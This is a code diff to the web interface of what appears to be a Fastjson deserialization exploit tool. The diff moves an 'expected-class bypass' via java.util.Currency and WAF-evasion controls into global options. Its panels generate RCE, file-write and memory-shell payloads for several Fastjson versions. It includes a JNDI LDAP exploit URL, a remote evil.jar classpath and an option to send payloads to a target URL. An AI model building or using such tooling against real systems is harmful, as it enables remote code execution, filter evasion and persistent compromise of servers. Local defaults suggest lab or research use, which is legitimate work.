@@ -435,7 +435,8 @@ function useMemShellConfig(backend: string) {
   }, [backend]);
   return config;
 }
-function CurrencyWrapControls({
+/** 期望类绕过（底层套 java.util.Currency），各 PoC 版本效果相同。 */
+function ExpectClassBypassControls({
   wrap,
   onWrapChange,
   field,
@@ -449,7 +450,7 @@ function CurrencyWrapControls({
   return (
     <div className="grid gap-4 sm:grid-cols-2">
       <div className="grid gap-2">
-        <Label>Currency 套层（getter）</Label>
+        <Label>期望类绕过</Label>
         <Select value={wrap} onValueChange={onWrapChange}>
           <SelectTrigger>
             <SelectValue />
@@ -460,7 +461,8 @@ function CurrencyWrapControls({
           </SelectContent>
         </Select>
         <p className="text-xs text-muted-foreground">
-          MiscCodec Currency 触发 getter，与 Fastjson 版本无关。
+          套 java.util.Currency（MiscCodec）触发 getter，绕过业务期望类限制；与
+          Fastjson 版本无关。
         </p>
       </div>
       {wrap === "true" ? (
@@ -479,6 +481,21 @@ function CurrencyWrapControls({
       ) : null}
     </div>
   );
+}
+
+/** 页面顶部全局：期望类绕过 + WAF，不随 PoC 版本 Tab 切换重置。 */
+type GlobalPocExtras = {
+  wrapCurrency: string;
+  currencyField: string;
+  waf: WafControlValue;
+};
+
+function resolve1247GetterTrigger(
+  base: string,
+  wrapCurrency: string,
+): string {
+  if (wrapCurrency !== "true") return base;
+  return base === "json_key" ? "currency_json_key" : "currency";
 }
 
 function Poc16723Panel() {
@@ -713,7 +730,7 @@ function Poc16723Panel() {
   );
 }
 
-function Poc1247Panel() {
+function Poc1247Panel({ wrapCurrency, currencyField, waf }: GlobalPocExtras) {
   const [gadgets, setGadgets] = useState<Poc1247Gadget[]>([]);
   const [gadget, setGadget] = useState("jdbc_rowset");
   const [jndiUrl, setJndiUrl] = useState("ldap://127.0.0.1:1389/Exploit");
@@ -723,7 +740,6 @@ function Poc1247Panel() {
   const [serializedB64, setSerializedB64] = useState("");
   const [h2Url, setH2Url] = useState("");
   const [getterTrigger, setGetterTrigger] = useState("ref");
-  const [currencyField, setCurrencyField] = useState("currency");
   const [jsonKeyWithType, setJsonKeyWithType] = useState("true");
   const [jsonKeyAsArray, setJsonKeyAsArray] = useState("false");
   const [engine, setEngine] = useState<EchoEngine>("auto");
@@ -735,7 +751,6 @@ function Poc1247Panel() {
   const [ms, setMs] = useState<MemShellState>(emptyMemShellState);
   const [target, setTarget] = useState("http://127.0.0.1:18247/api/fastjson");
   const [send, setSend] = useState("false");
-  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
   const [loading, setLoading] = useState(false);
   const [result, setResult] = useState<Poc1247Result | null>(null);
   const msConfig = useMemShellConfig(ms.api);
@@ -765,7 +780,7 @@ function Poc1247Panel() {
         user_overrides: userOverrides.trim() || null,
         serialized_b64: serializedB64.trim() || null,
         h2_url: h2Url.trim() || null,
-        getter_trigger: getterTrigger,
+        getter_trigger: resolve1247GetterTrigger(getterTrigger, wrapCurrency),
         currency_field: currencyField,
         json_key_with_type: jsonKeyWithType === "true",
         json_key_as_array: jsonKeyAsArray === "true",
@@ -1021,44 +1036,23 @@ function Poc1247Panel() {
           ) : null}
 
           <div className="grid gap-2">
-            <Label>Getter 触发</Label>
+            <Label>Getter 触发形态</Label>
             <Select value={getterTrigger} onValueChange={setGetterTrigger}>
               <SelectTrigger>
                 <SelectValue />
               </SelectTrigger>
               <SelectContent>
-                <SelectItem value="ref">$ref（无期望类，默认）</SelectItem>
+                <SelectItem value="ref">$ref（默认）</SelectItem>
                 <SelectItem value="json_key">JSONObject 作 Map key</SelectItem>
-                <SelectItem value="currency">Currency 套层（有期望类）</SelectItem>
-                <SelectItem value="currency_json_key">
-                  Currency + json_key（java-chains）
-                </SelectItem>
               </SelectContent>
             </Select>
             <p className="text-xs text-muted-foreground">
-              有期望类时选 currency / currency_json_key；json_key 可省 @type 或改
-              JSONArray。
+              期望类绕过在页面顶部统一开关；开启后自动叠加 Currency（json_key →
+              currency_json_key）。
             </p>
           </div>
 
-          {getterTrigger === "currency" ||
-          getterTrigger === "currency_json_key" ? (
-            <div className="grid gap-2">
-              <Label>Currency 字段</Label>
-              <Select value={currencyField} onValueChange={setCurrencyField}>
-                <SelectTrigger>
-                  <SelectValue />
-                </SelectTrigger>
-                <SelectContent>
-                  <SelectItem value="currency">currency</SelectItem>
-                  <SelectItem value="currencyCode">currencyCode</SelectItem>
-                </SelectContent>
-              </Select>
-            </div>
-          ) : null}
-
-          {getterTrigger === "json_key" ||
-          getterTrigger === "currency_json_key" ? (
+          {getterTrigger === "json_key" ? (
             <div className="grid gap-4 sm:grid-cols-2">
               <div className="grid gap-2">
                 <Label>json_key 带 @type</Label>
@@ -1116,8 +1110,6 @@ function Poc1247Panel() {
             </div>
           </div>
 
-          <WafControls value={waf} onChange={setWaf} />
-
           <Separator />
           <div className="flex flex-wrap gap-2">
             <Button
@@ -1159,8 +1151,8 @@ function Poc1247Panel() {
               需 JNDI 出网。
             </p>
             <p>
-              Getter：无期望类用 <code>$ref</code> / JSONObject 作 key；有期望类套{" "}
-              <code>java.util.Currency</code>。
+              Getter：无期望类用 <code>$ref</code> / JSONObject 作 key；有期望类在顶部开「期望类绕过」（套{" "}
+              <code>java.util.Currency</code>）。
             </p>
             {current ? (
               <p>
@@ -1238,7 +1230,7 @@ function Poc1247Panel() {
   );
 }
 
-function Poc1268Panel() {
+function Poc1268Panel({ wrapCurrency, currencyField, waf }: GlobalPocExtras) {
   const [gadgets, setGadgets] = useState<Poc1268Gadget[]>([]);
   const [gadget, setGadget] = useState("file_truncate");
   const [file, setFile] = useState("/tmp/fj1268_demo");
@@ -1252,8 +1244,6 @@ function Poc1268Panel() {
   const [socketFactoryArg, setSocketFactoryArg] = useState(
     "http://host.docker.internal:18099/bean.xml",
   );
-  const [wrapCurrency, setWrapCurrency] = useState("false");
-  const [currencyField, setCurrencyField] = useState("currency");
   const [preset, setPreset] = useState<RcePresetMode>("file");
   const [rceClassB64, setRceClassB64] = useState("");
   const [engine, setEngine] = useState<EchoEngine>("auto");
@@ -1262,7 +1252,6 @@ function Poc1268Panel() {
   const [ms, setMs] = useState<MemShellState>(emptyMemShellState);
   const [target, setTarget] = useState("http://127.0.0.1:18268/api/fastjson");
   const [send, setSend] = useState("false");
-  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
   const [loading, setLoading] = useState(false);
   const [result, setResult] = useState<Poc1268Result | null>(null);
   const msConfig = useMemShellConfig(ms.api);
@@ -1522,13 +1511,6 @@ function Poc1268Panel() {
             </div>
           ) : null}
 
-          <CurrencyWrapControls
-            wrap={wrapCurrency}
-            onWrapChange={setWrapCurrency}
-            field={currencyField}
-            onFieldChange={setCurrencyField}
-          />
-
           <div className="grid gap-4 sm:grid-cols-2">
             <div className="grid gap-2">
               <Label htmlFor="target-1268">目标 URL（可选发送）</Label>
@@ -1551,8 +1533,6 @@ function Poc1268Panel() {
               </Select>
             </div>
           </div>
-
-          <WafControls value={waf} onChange={setWaf} />
 
           <Separator />
           <div className="flex flex-wrap gap-2">
@@ -1662,12 +1642,13 @@ function Poc1268Panel() {
   );
 }
 
-function Poc1280Panel() {
+function Poc1280Panel({ wrapCurrency, currencyField, waf }: GlobalPocExtras) {
   const [gadgets, setGadgets] = useState<Poc1280Gadget[]>([]);
   const [gadget, setGadget] = useState("io_write");
   const [file, setFile] = useState("/tmp/fj1280_io_write");
   const [content, setContent] = useState("FJ1280_IO_WRITE");
   const [url, setUrl] = useState("file:///tmp/fj1280_read_src");
+  const [guessByte, setGuessByte] = useState("70");
   const [host, setHost] = useState("127.0.0.1");
   const [port, setPort] = useState("2333");
   const [socketFactoryArg, setSocketFactoryArg] = useState(
@@ -1676,8 +1657,6 @@ function Poc1280Panel() {
   const [classpath, setClasspath] = useState(
     "http://127.0.0.1:18080/attack/evil.jar",
   );
-  const [wrapCurrency, setWrapCurrency] = useState("false");
-  const [currencyField, setCurrencyField] = useState("currency");
   const [preset, setPreset] = useState<RcePresetMode>("file");
   const [rceClassB64, setRceClassB64] = useState("");
   const [engine, setEngine] = useState<EchoEngine>("auto");
@@ -1687,7 +1666,6 @@ function Poc1280Panel() {
   const [target, setTarget] = useState("http://127.0.0.1:18280/api/fastjson");
   const [send, setSend] = useState("false");
   const [resetCache, setResetCache] = useState("true");
-  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
   const [loading, setLoading] = useState(false);
   const [result, setResult] = useState<Poc1280Result | null>(null);
   const msConfig = useMemShellConfig(ms.api);
@@ -1713,6 +1691,7 @@ function Poc1280Panel() {
         file: file.trim() || null,
         content: content.trim() || null,
         url: url.trim() || null,
+        guess_byte: guessByte ? Number(guessByte) : null,
         host: host.trim() || null,
         port: port ? Number(port) : null,
         socket_factory_arg: socketFactoryArg.trim() || null,
@@ -1939,13 +1918,6 @@ function Poc1280Panel() {
             </div>
           ) : null}
 
-          <CurrencyWrapControls
-            wrap={wrapCurrency}
-            onWrapChange={setWrapCurrency}
-            field={currencyField}
-            onFieldChange={setCurrencyField}
-          />
-
           <div className="grid gap-4 sm:grid-cols-2">
             <div className="grid gap-2">
               <Label htmlFor="target-1280">目标 URL（可选发送）</Label>
@@ -1981,8 +1953,6 @@ function Poc1280Panel() {
               </SelectContent>
             </Select>
           </div>
-
-          <WafControls value={waf} onChange={setWaf} />
 
           <Separator />
           <div className="flex flex-wrap gap-2">
@@ -2107,6 +2077,11 @@ function Poc1280Panel() {
 }
 
 export default function PocPage() {
+  const [wrapCurrency, setWrapCurrency] = useState("false");
+  const [currencyField, setCurrencyField] = useState("currency");
+  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
+  const extras: GlobalPocExtras = { wrapCurrency, currencyField, waf };
+
   return (
     <main className="mx-auto flex w-full max-w-6xl flex-1 flex-col gap-6 px-6 py-8">
       <div className="space-y-2">
@@ -2120,6 +2095,24 @@ export default function PocPage() {
         </p>
       </div>
 
+      <Card>
+        <CardHeader className="pb-3">
+          <CardTitle className="text-base">全局选项</CardTitle>
+          <CardDescription>
+            期望类绕过与 WAF 变换对各 PoC 版本效果相同，切换 Tab 不会重置。
+          </CardDescription>
+        </CardHeader>
+        <CardContent className="space-y-4">
+          <ExpectClassBypassControls
+            wrap={wrapCurrency}
+            onWrapChange={setWrapCurrency}
+            field={currencyField}
+            onFieldChange={setCurrencyField}
+          />
+          <WafControls value={waf} onChange={setWaf} />
+        </CardContent>
+      </Card>
+
       <Tabs defaultValue="1280">
         <TabsList>
           <TabsTrigger value="1247">≤1.2.47 缓存绕过</TabsTrigger>
@@ -2128,13 +2121,13 @@ export default function PocPage() {
           <TabsTrigger value="16723">1.2.83 CVE-2026-16723 RCE</TabsTrigger>
         </TabsList>
         <TabsContent value="1247" className="mt-6">
-          <Poc1247Panel />
+          <Poc1247Panel {...extras} />
         </TabsContent>
         <TabsContent value="1268" className="mt-6">
-          <Poc1268Panel />
+          <Poc1268Panel {...extras} />
         </TabsContent>
         <TabsContent value="1280" className="mt-6">
-          <Poc1280Panel />
+          <Poc1280Panel {...extras} />
         </TabsContent>
         <TabsContent value="16723" className="mt-6">
           <Poc16723Panel />
